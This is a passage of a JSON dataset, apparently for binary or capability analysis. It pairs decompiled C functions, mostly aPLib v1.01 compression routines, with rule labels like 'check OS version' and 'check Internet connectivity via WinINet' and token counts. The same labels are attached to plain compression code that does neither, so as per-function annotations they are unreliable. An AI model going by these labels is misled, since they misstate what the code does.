        "decompiled_code": "\nchar fcn.00410880(int32_t param_1)\n\n{\n    if (param_1 < 2) {\n        return 'd';\n    }\n    if (param_1 < 4) {\n        return '\\x02';\n    }\n    if (param_1 < 8) {\n        return '\\x04';\n    }\n    if (param_1 < 0x10) {\n        return '\\x06';\n    }\n    if (param_1 < 0x20) {\n        return '\\b';\n    }\n    if (param_1 < 0x40) {\n        return '\\n';\n    }\n    if (param_1 < 0x80) {\n        return '\\f';\n    }\n    if (param_1 < 0x100) {\n        return '\\x0e';\n    }\n    if (param_1 < 0x200) {\n        return '\\x10';\n    }\n    if (param_1 < 0x400) {\n        return '\\x12';\n    }\n    if (param_1 < 0x800) {\n        return '\\x14';\n    }\n    if (param_1 < 0x1000) {\n        return '\\x16';\n    }\n    if (param_1 < 0x2000) {\n        return '\\x18';\n    }\n    if (param_1 < 0x4000) {\n        return '\\x1a';\n    }\n    if (param_1 < 0x8000) {\n        return '\\x1c';\n    }\n    return (0xffff < param_1) * '\\x02' + '\\x1e';\n}\n",
        "token_count": 350
    },
    "0041096c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041096c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    \n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    pcVar2 = *(param_1 + 0x418);\n    if (param_2 != 0) {\n        *pcVar2 = *pcVar2 * '\\x02' + '\\x01';\n        return;\n    }\n    *pcVar2 = *pcVar2 << 1;\n    return;\n}\n",
        "token_count": 219
    },
    "00410a13": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00410a13(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    \n    uVar4 = param_2;\n    iVar3 = 0;\n    do {\n        iVar5 = iVar3;\n        uVar6 = param_2 & 1;\n        param_2 = param_2 >> 1;\n        uVar4 = uVar6 + uVar4 * 2;\n        iVar3 = iVar5 + 1;\n    } while (1 < param_2);\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        pcVar2 = *(param_1 + 0x418);\n        if ((uVar4 & 1) == 0) {\n            *pcVar2 = *pcVar2 << 1;\n        }\n        else {\n            *pcVar2 = *pcVar2 * '\\x02' + '\\x01';\n        }\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        uVar4 = uVar4 >> 1;\n        **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n    }\n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    pcVar2 = *(param_1 + 0x418);\n    if ((uVar4 & 1) == 0) {\n        *pcVar2 = *pcVar2 << 1;\n    }\n    else {\n        *pcVar2 = *pcVar2 * '\\x02' + '\\x01';\n    }\n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n    return;\n}\n",
        "token_count": 825
    },
    "00410e7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00410e7c(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    char cVar3;\n    \n    uVar2 = param_2;\n    cVar3 = param_2;\n    if (*(param_1 + 0x428) == 0) {\n        *(param_1 + 0x428) = 1;\n        if (((param_2 < 0x80) && (param_3 < 4)) && (param_2 != *(param_1 + 0x424))) {\n            fcn.004109de();\n            fcn.004109de();\n            fcn.004109af();\n            **(param_1 + 0x410) = (param_3 & 1) + cVar3 * '\\x02';\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n            *(param_1 + 0x424) = param_2;\n            return;\n        }\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        if (param_2 == *(param_1 + 0x424)) {\n            piVar1 = param_1 + 0x41c;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                *(param_1 + 0x418) = *(param_1 + 0x410);\n                *(param_1 + 0x41c) = 8;\n                *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n            }\n            **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n            piVar1 = param_1 + 0x41c;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                *(param_1 + 0x418) = *(param_1 + 0x410);\n                *(param_1 + 0x41c) = 8;\n                *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n            }\n            **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        }\n        else {\n            fcn.00410a13((param_2 >> 8) + 3);\n            **(param_1 + 0x410) = cVar3;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n            *(param_1 + 0x424) = param_2;\n            if (param_2 < 0x80) {\n                fcn.00410a13(param_2 - 2);\n                return;\n            }\n            if (0x4ff < param_2) {\n                param_2 = param_2 - 1;\n            }\n            if (31999 < uVar2) {\n                fcn.00410a13(param_2 - 1);\n                return;\n            }\n        }\n        fcn.00410a13(param_2);\n        return;\n    }\n    if ((param_2 < 0x80) && (param_3 < 4)) {\n        fcn.004109de();\n        fcn.004109de();\n        fcn.004109af();\n        **(param_1 + 0x410) = (param_3 & 1) + cVar3 * '\\x02';\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        *(param_1 + 0x424) = param_2;\n        return;\n    }\n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n    fcn.00410a13((param_2 >> 8) + 2);\n    **(param_1 + 0x410) = cVar3;\n    *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    *(param_1 + 0x424) = param_2;\n    if (param_2 < 0x80) {\n        fcn.00410a13(param_2 - 2);\n        return;\n    }\n    if (0x4ff < param_2) {\n        param_2 = param_2 - 1;\n    }\n    if (31999 < uVar2) {\n        param_2 = param_2 - 1;\n    }\n    fcn.00410a13(param_2);\n    return;\n}\n",
        "token_count": 1579
    },
    "00411176": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00411176(int32_t *param_1, uint8_t **param_2, uint8_t *param_3, uint8_t *param_4, uint8_t *param_5)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint8_t *unaff_ESI;\n    uint32_t uVar8;\n    bool bVar9;\n    uint8_t *puVar10;\n    uint8_t *puStack16;\n    uint8_t *puStack8;\n    int32_t iStack4;\n    \n    puStack16 = NULL;\n    puStack8 = NULL;\n    puVar7 = param_1[0x102];\n    while (puVar7 < param_3) {\n        uVar8 = param_1[0x101];\n        if (uVar8 < uVar8 + 0x16800) {\n            uVar1 = param_1[0x103];\n            if (uVar1 < uVar8) {\n                iVar2 = uVar8 - uVar1;\n            }\n            else {\n                iVar2 = (uVar8 - uVar1) + 0x16800;\n            }\n        }\n        else {\n            iVar2 = 0;\n        }\n        *(*param_1 + iVar2 * 4) = *(param_1[*param_1[0x102] + 1] + param_1[0x102][1] * 4);\n        *(param_1[*param_1[0x102] + 1] + param_1[0x102][1] * 4) = param_1[0x101];\n        param_1[0x101] = param_1[0x101] + 1;\n        param_1[0x102] = param_1[0x102] + 1;\n        if (0x16800 < param_1[0x101] - param_1[0x103]) {\n            param_1[0x103] = param_1[0x101] + -1;\n        }\n        puVar7 = param_1[0x102];\n    }\n    puVar7 = puStack16;\n    puVar10 = puStack8;\n    if (param_5 < 0x16701) {\n        if (param_5 < 0x2) goto code_r0x00411422;\n    }\n    else {\n        param_5 = 0x16700;\n    }\n    uVar8 = *(param_1[*param_3 + 1] + param_3[1] * 4);\n    if (uVar8 != 0) {\n        iStack4 = 0x800;\n        while ((puVar4 = uVar8 + param_1[0x108],  param_3 <= puVar4 && (uVar8 != 0))) {\n            if (uVar8 + 0x16800 < param_1[0x101] || uVar8 + 0x16800 == param_1[0x101]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar1 = param_1[0x103];\n                if (uVar1 < uVar8) {\n                    iVar2 = uVar8 - uVar1;\n                }\n                else {\n                    iVar2 = (uVar8 - uVar1) + 0x16800;\n                }\n            }\n            uVar8 = *(*param_1 + iVar2 * 4);\n        }\n        if (0x16700 < param_4) {\n            param_4 = 0x16700;\n        }\n        puVar6 = param_3;\n        if (uVar8 != 0) {\n            while (puVar5 = puVar6 + -puVar4,  puVar7 = puStack16,  puVar10 = puStack8,  puVar5 <= param_4) {\n                puVar7 = 0x2;\n                if ((puStack16[puVar4] == puVar6[puStack16]) || (puVar5 == param_1[0x109])) {\n                    bVar9 = param_5 == 0x2;\n                    if (0x2 < param_5) {\n                        puVar6 = puVar6 + 2;\n                        do {\n                            if (puVar6[puVar4 - param_3] != *puVar6) break;\n                            puVar7 = puVar7 + 1;\n                            puVar6 = puVar6 + 1;\n                        } while (puVar7 < param_5);\n                        bVar9 = puVar7 == param_5;\n                        puVar6 = param_3;\n                    }\n                    puVar10 = puVar5;\n                    if (bVar9) break;\n                    if (puStack16 < puVar7) {\n                        iVar2 = fcn.00410dfa(puVar5, puVar7);\n                        puVar10 = puStack16;\n                        puVar5 = unaff_ESI;\n                        iVar3 = fcn.00410dfa();\n                        puVar6 = puStack8;\n                        unaff_ESI = puVar5;\n                        if (puVar7 <= puVar10 + ((iVar2 - iVar3) * 2) / 0xd) goto code_r0x00411386;\ncode_r0x004113d0:\n                        puVar6 = puStack8;\n                        puStack16 = puVar7;\n                    }\n                    else {\ncode_r0x00411386:\n                        if (puVar5 == param_1[0x109]) {\n                            iVar2 = fcn.00410dfa(puVar5, puVar7);\n                            puVar10 = puStack16;\n                            iVar3 = fcn.00410dfa();\n                            puVar6 = NULL;\n                            if (puVar10 <= puVar7 + (iVar3 - iVar2) / 6) goto code_r0x004113d0;\n                        }\n                    }\n                }\n                if (uVar8 + 0x16800 < param_1[0x101] || uVar8 + 0x16800 == param_1[0x101]) {\n                    iVar2 = 0;\n                }\n                else {\n                    uVar1 = param_1[0x103];\n                    if (uVar1 < uVar8) {\n                        iVar2 = uVar8 - uVar1;\n                    }\n                    else {\n                        iVar2 = (uVar8 - uVar1) + 0x16800;\n                    }\n                }\n                uVar8 = *(*param_1 + iVar2 * 4);\n                puVar4 = param_1[0x108] + uVar8;\n                iStack4 = iStack4 + -1;\n                puVar7 = puStack16;\n                puVar10 = puStack8;\n                if ((iStack4 == 0) || (uVar8 == 0)) break;\n            }\n        }\n    }\ncode_r0x00411422:\n    puStack8 = puVar10;\n    puStack16 = puVar7;\n    param_2[1] = puStack16;\n    *param_2 = puStack8;\n    return;\n}\n",
        "token_count": 1603
    },
    "0041143d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __thiscall\nfcn.0041143d(int32_t *param_1, int32_t param_2, int32_t param_3, int32_t *param_4, int32_t *param_5, code *param_6, \n            int32_t *param_7)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    int32_t *unaff_EDI;\n    int32_t *piVar9;\n    int32_t *unaff_retaddr;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    int32_t *piStack40;\n    int32_t *piStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    int32_t iStack24;\n    uint uStack20;\n    int32_t *piStack16;\n    int32_t *piStack12;\n    int32_t *piStack8;\n    int32_t *piStack4;\n    \n    if (param_4 == NULL) {\n        return 0;\n    }\n    if (((param_2 == 0) || (param_3 == 0)) || (param_5 == NULL)) {\n        return 0xffffffff;\n    }\n    param_1[0x105] = param_2;\n    param_1[0x108] = param_2 + -1;\n    param_1[0x104] = param_3;\n    uVar1 = 0xabeefbee;\n    uVar5 = 0;\n    do {\n        uVar1 = (uVar1 << 1 | uVar1 < 0) ^\n                \"\\r\\n\\r\\naPLib v1.01  -  the smaller the better :)\\r\\nCopyright (c) 1998-2009 by Joergen Ibsen, All Rights Reserved.\\r\\n\\r\\nMore information: http://www.ibsensoftware.com/\\r\\n\\r\\n\"\n                [uVar5];\n        uVar1 = (uVar1 << 1 | uVar1 < 0) ^\n                \"\\r\\n\\r\\naPLib v1.01  -  the smaller the better :)\\r\\nCopyright (c) 1998-2009 by Joergen Ibsen, All Rights Reserved.\\r\\n\\r\\nMore information: http://www.ibsensoftware.com/\\r\\n\\r\\n\"\n                [uVar5 + 1];\n        uVar1 = (uVar1 << 1 | uVar1 < 0) ^\n                \"\\r\\n\\r\\naPLib v1.01  -  the smaller the better :)\\r\\nCopyright (c) 1998-2009 by Joergen Ibsen, All Rights Reserved.\\r\\n\\r\\nMore information: http://www.ibsensoftware.com/\\r\\n\\r\\n\"\n                [uVar5 + 2];\n        iVar6 = uVar5 + 3;\n        uVar5 = uVar5 + 4;\n        uVar1 = (uVar1 << 1 | uVar1 < 0) ^\n                \"\\r\\n\\r\\naPLib v1.01  -  the smaller the better :)\\r\\nCopyright (c) 1998-2009 by Joergen Ibsen, All Rights Reserved.\\r\\n\\r\\nMore information: http://www.ibsensoftware.com/\\r\\n\\r\\n\"\n                [iVar6];\n    } while (uVar5 < 0x100);\n    if (uVar1 == 0) {\n        *param_1 = param_5;\n        piVar8 = param_1 + 1;\n        iVar6 = param_5 + 0x5a018;\n        piVar9 = 0x100;\n        do {\n            *piVar8 = iVar6;\n            uVar1 = 0;\n            do {\n                *(*piVar8 + uVar1) = 0;\n                uVar1 = uVar1 + 4;\n            } while (uVar1 < 0x400);\n            iVar6 = iVar6 + 0x400;\n            piVar8 = piVar8 + 1;\n            piVar9 = piVar9 - 1;\n        } while (piVar9 != NULL);\n        param_1[0x109] = -1;\n        param_1[0x102] = param_1[0x105];\n        param_1[0x101] = 1;\n        param_1[0x103] = 0;\n        **param_1 = 0;\n        param_1[0x10a] = 0;\n        piStack44 = 0xffffffff;\n        *param_1[0x104] = *param_1[0x105];\n        param_1[0x105] = param_1[0x105] + 1;\n        param_1[0x104] = param_1[0x104] + 1;\n        param_1[0x107] = 1;\n        param_5 = 0x1;\n        piVar8 = piVar9;\n        piStack48 = piVar9;\n        piVar7 = 0x1;\n        if (1 < param_4 - 1U) {\n            do {\n                if (((param_6 != NULL) && (piStack48 = piStack48 + 1,  piStack48 == '\\0')) &&\n                   (iVar6 = (*param_6)(param_4, param_1[0x105] - param_2, param_1[0x104] - param_3, param_7), \n                   iVar6 == 0)) {\n                    return 0xffffffff;\n                }\n                if (param_5 == piStack44) {\n                    piStack28 = piStack4;\n                    piStack32 = piStack8;\n                    piVar7 = piStack4;\n                }\n                else {\n                    fcn.00411176();\n                    piVar7 = piStack44;\n                }\n                if (piVar7 < 2) {\n                    if (piVar9 == NULL) {\n                        fcn.00410b72();\n                    }\n                    else {\n                        piVar9 = piVar9 + 1;\n                    }\ncode_r0x00411bbc:\n                    param_1[0x105] = param_1[0x105] + 1;\n                }\n                else {\n                    piVar11 = NULL;\n                    piVar4 = param_5;\n                    piVar10 = param_5;\n                    if (piStack32 == param_1[0x109]) {\n                        if ((0x1 < piVar9) && (piStack16 != param_1[0x109])) {\n                            iVar6 = fcn.00410b19(piVar8, param_5 - piVar9, piVar9);\n                            iVar2 = fcn.00410dfa(piStack28, piVar9);\n                            if (((iVar2 < iVar6) && ((piStack36 < 0x500 || (piVar9 != 0x2)))) &&\n                               ((piVar4 = piStack4,  piStack36 < 32000 || (piVar9 != 0x3)))) goto code_r0x00411676;\n                        }\n                    }\n                    else {\ncode_r0x00411676:\n                        piStack40 = param_4 - piVar4;\n                        fcn.00411176(&piStack8, param_1[0x105] + 1, piVar4 + 1, piStack40 - 1);\n                        piVar10 = piStack28;\n                        if (iStack24 < piStack48) {\n                            fcn.00410dfa(piStack48, piVar7);\n                            fcn.00410dfa(piStack32, piStack28);\n                            piVar4 = piStack16;\n                        }\n                        else {\n                            fcn.00410dfa(piStack48, piVar7);\n                            fcn.00410dfa(piStack32, piStack28);\n                        }\n                        if ((piVar9 != NULL) && (piVar7 <= piStack36)) {\n                            iVar6 = fcn.00410dfa(unaff_EDI, piVar7);\n                            iVar2 = fcn.00410dfa();\n                            piVar4 = piStack32;\n                            if (iVar2 < iVar6) {\n                                piVar10 = 0x1;\n                            }\n                        }\n                        if ((piVar9 != NULL) || (piVar7 <= piStack4)) {\ncode_r0x004117b0:\n                            if (piVar11 == NULL) goto code_r0x004117bb;\ncode_r0x00411b89:\n                            if (piVar9 == NULL) {\n                                piVar8 = param_1[0x105];\n                                piStack16 = piStack32;\n                                piStack12 = piVar7;\n                            }\n                            piVar9 = piVar9 + 1;\n                            param_5 = piVar4;\n                            goto code_r0x00411bbc;\n                        }\n                        iVar6 = fcn.00410b19(param_1[0x105], piVar4, 1);\n                        iVar2 = fcn.00410dfa(uStack20, piStack16);\n                        iVar3 = fcn.00410dfa(piVar10, piVar7);\n                        piVar4 = piStack12;\n                        if (iVar2 + 1 + iVar6 <= iVar3) goto code_r0x004117b0;\ncode_r0x004117bb:\n                        piVar10 = piVar4;\n                        if (2 < piVar7) {\n                            fcn.00411176(&iStack24, param_1[0x105] + 2, piVar4 + 2, piStack40 - 2);\n                            if (piStack40 < piStack48) {\n                                fcn.00410dfa(piStack40, piStack36);\n                                fcn.00410dfa(piVar8, piVar7);\n                            }\n                            else {\n                                fcn.00410dfa(piStack40, piStack36);\n                                fcn.00410dfa(piVar8, piVar7);\n                            }\n                            if ((piVar9 != NULL) && (piVar7 <= piVar11)) {\n                                iVar6 = fcn.00410dfa(piVar8, piVar11);\n                                iVar2 = fcn.00410dfa();\n                                piVar4 = param_5;\n                                if (iVar6 < iVar2) goto code_r0x00411b89;\n                            }\n                            piVar4 = param_5;\n                            if (piVar11 != NULL) goto code_r0x00411b89;\n                            piVar10 = param_5;\n                            if (3 < piVar7) {\n                                fcn.00411176(&iStack24, param_1[0x105] + 3, param_5 + 3, piStack40 - 3);\n                                if (piStack40 < piStack48) {\n                                    fcn.00410dfa(piStack40, piStack36);\n                                    fcn.00410dfa(piStack48, piVar7);\n                                }\n                                else {\n                                    fcn.00410dfa(piStack40, piStack36);\n                                    fcn.00410dfa(piStack48, piVar7);\n                                }\n                                if ((piVar9 != NULL) && (piVar7 <= piVar11)) {\n                                    iVar6 = fcn.00410dfa(piVar8, piVar11);\n                                    iVar2 = fcn.00410dfa();\n                                    if (iVar6 < iVar2) goto code_r0x00411b89;\n                                }\n                                if (piVar11 != NULL) goto code_r0x00411b89;\n                            }\n                        }\n                    }\n                    if (piVar9 != NULL) {\n                        if (piVar9 < 0x2) {\n                            fcn.00410b72(piVar8, piVar10 - 1);\ncode_r0x00411ae0:\n                            piVar9 = NULL;\n                        }\n                        else {\n                            piVar4 = param_4 + (piVar9 - piVar10);\n                            if (piVar9 < piVar4) {\n                                piVar4 = piVar9;\n                            }\n                            piVar11 = piVar10 - piVar9;\n                            piVar10 = piVar11;\n                            fcn.00411176(&iStack24, piVar8, piVar11, piVar4);\n                            if (piVar9 <= piStack36) {\n                                iVar6 = fcn.00410dfa(piStack40, piVar9);\n                                piVar11 = piVar8;\n                                iVar2 = fcn.00410dfa(piStack40, piVar9);\n                                if (iVar6 < iVar2) {\n                                    piStack44 = piVar10;\n                                }\n                            }\n                            piVar8 = piStack28;\n                            iVar2 = fcn.00410b19();\n                            unaff_EDI = unaff_retaddr;\n                            iVar3 = fcn.00410dfa(unaff_retaddr, piVar9);\n                            iVar6 = iStack24;\n                            piVar10 = param_7;\n                            piStack48 = piVar9;\n                            if (iVar3 < iVar2) {\n                                if (iStack24 == param_1[0x109]) {\n                                    piStack40 = fcn.00410b19(piVar9, piStack44, piVar9);\n                                    iVar2 = fcn.00410dfa(iVar6, piVar7);\n                                    piStack48 = piVar9 + iVar2;\n                                    iVar6 = fcn.00410dfa(iVar6 + 1, piVar7);\n                                    unaff_EDI = piStack36;\n                                    piVar7 = piVar8;\n                                    iVar2 = fcn.00410dfa();\n                                    piVar10 = piStack12;\n                                    piVar8 = piVar7;\n                                    if (unaff_EDI <= iVar6 + iVar2) goto code_r0x00411ab4;\n                                }\n                                if (((piStack8 == param_1[0x109]) && (param_1[0x10a] == 0)) ||\n                                   (((piStack8 < 0x500 || (piVar9 != 0x2)) && ((piStack8 < 32000 || (piVar9 != 0x3))))))\n                                {\n                                    fcn.00410e7c(piStack8);\n                                    goto code_r0x00411ae0;\n                                }\n                            }\ncode_r0x00411ab4:\n                            do {\n                                fcn.00410b72(piStack48);\n                                piVar8 = piVar8 + 1;\n                                piVar9 = piVar9 + -1;\n                            } while (piVar9 != NULL);\n                        }\n                    }\n                    param_5 = piVar10;\n                    if (piVar7 < 4) {\n                        iVar6 = fcn.00410b19(param_1[0x105], piVar10, piVar7);\n                        iVar2 = fcn.00410dfa(piStack44, piVar7);\n                        param_5 = piStack4;\n                        piVar4 = piVar7;\n                        if ((iVar6 < iVar2) ||\n                           (((piVar11 != param_1[0x109] || (param_1[0x10a] != 0)) &&\n                            (((0x4ff < piVar11 && (piVar7 == 0x2)) || (31999 < piVar11)))))) {\n                            while (piVar4 != NULL) {\n                                fcn.00410b72();\n                                param_1[0x105] = param_1[0x105] + 1;\n                                piVar10 = piVar10 - 1;\n                                piVar4 = piVar10;\n                            }\n                            param_5 = (piVar7 - 1U) + param_5;\n                            goto code_r0x00411bc2;\n                        }\n                    }\n                    fcn.00410e7c();\n                    param_1[0x105] = param_1[0x105] + piVar7;\n                    param_5 = (piVar7 - 1U) + param_5;\n                }\ncode_r0x00411bc2:\n                piVar10 = piVar9;\n                if ((piVar9 != NULL) && (piVar9 == piStack12)) {\n                    piVar7 = param_5 - piVar9;\n                    piVar4 = piVar7;\n                    fcn.00411176();\n                    piStack44 = &iStack24;\n                    if (piVar9 <= piStack36) {\n                        iVar6 = fcn.00410dfa(piStack40, piVar9);\n                        piStack44 = piStack40;\n                        piVar7 = piVar8;\n                        iVar2 = fcn.00410dfa();\n                        if (iVar6 < iVar2) {\n                            piStack44 = piVar4;\n                        }\n                    }\n                    piVar8 = piStack28;\n                    iVar6 = fcn.00410b19(piStack28, piVar7);\n                    unaff_EDI = unaff_retaddr;\n                    iVar2 = fcn.00410dfa(unaff_retaddr, piVar9);\n                    piStack48 = piVar9;\n                    if ((iVar2 < iVar6) &&\n                       (((piStack8 == param_1[0x109] && (param_1[0x10a] == 0)) ||\n                        (((piStack8 < 0x500 || (piVar9 != 0x2)) && ((piStack8 < 32000 || (piVar9 != 0x3)))))))) {\n                        fcn.00410e7c(piStack8);\n                        piVar10 = NULL;\n                    }\n                    else {\n                        do {\n                            fcn.00410b72(piVar9);\n                            piVar8 = piVar9 + 1;\n                            piVar10 = piVar10 + -1;\n                            piVar9 = piVar8;\n                        } while (piVar10 != NULL);\n                    }\n                }\n                param_5 = param_5 + 1;\n                piVar9 = piVar10;\n            } while (param_5 < param_4 - 1U);\n            piVar7 = param_5;\n            if (piVar10 != NULL) {\n                if (piVar10 < 0x2) {\n                    fcn.00410b72();\n                }\n                else {\n                    iVar6 = fcn.00410b19(piVar8, param_5 - piVar10, piVar10);\n                    iVar2 = fcn.00410dfa();\n                    if ((iVar6 < iVar2) ||\n                       (((piStack36 != param_1[0x109] || (param_1[0x10a] != 0)) &&\n                        (((0x4ff < piStack36 && (piVar10 == 0x2)) || ((31999 < piStack36 && (piVar10 == 0x3)))))))) {\n                        do {\n                            fcn.00410b72(piVar9, param_5 - piVar10, piStack28);\n                            piVar9 = piVar9 + 1;\n                            piVar10 = piVar10 + -1;\n                        } while (piVar10 != NULL);\n                    }\n                    else {\n                        fcn.00410e7c();\n                    }\n                }\n            }\n        }\n        for (; piVar7 < param_4; piVar7 = piVar7 + 1) {\n            fcn.00410b72();\n            param_1[0x105] = param_1[0x105] + 1;\n        }\n        piVar8 = param_1 + 0x107;\n        *piVar8 = *piVar8 + -1;\n        if (*piVar8 == 0) {\n            param_1[0x106] = param_1[0x104];\n            param_1[0x107] = 8;\n            param_1[0x104] = param_1[0x104] + 1;\n        }\n        *param_1[0x106] = *param_1[0x106] * '\\x02' + '\\x01';\n        piVar8 = param_1 + 0x107;\n        *piVar8 = *piVar8 + -1;\n        if (*piVar8 == 0) {\n            param_1[0x106] = param_1[0x104];\n            param_1[0x107] = 8;\n            param_1[0x104] = param_1[0x104] + 1;\n        }\n        *param_1[0x106] = *param_1[0x106] * '\\x02' + '\\x01';\n        piVar8 = param_1 + 0x107;\n        *piVar8 = *piVar8 + -1;\n        if (*piVar8 == 0) {\n            param_1[0x106] = param_1[0x104];\n            param_1[0x107] = 8;\n            param_1[0x104] = param_1[0x104] + 1;\n        }\n        *param_1[0x106] = *param_1[0x106] << 1;\n        *param_1[0x104] = 0;\n        param_1[0x104] = param_1[0x104] + 1;\n        *param_1[0x106] = *param_1[0x106] << (param_1[0x107] - 1U & 0x1f);\n        if ((param_6 != NULL) &&\n           (iVar6 = (*param_6)(param_4, param_1[0x105] - param_2, param_1[0x104] - param_3, param_7),  iVar6 == 0)) {\n            return 0xffffffff;\n        }\n        uVar1 = param_1[0x104] - param_3;\n    }\n    return uVar1;\n}\n",
        "token_count": 4816
    },
    "00411f00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
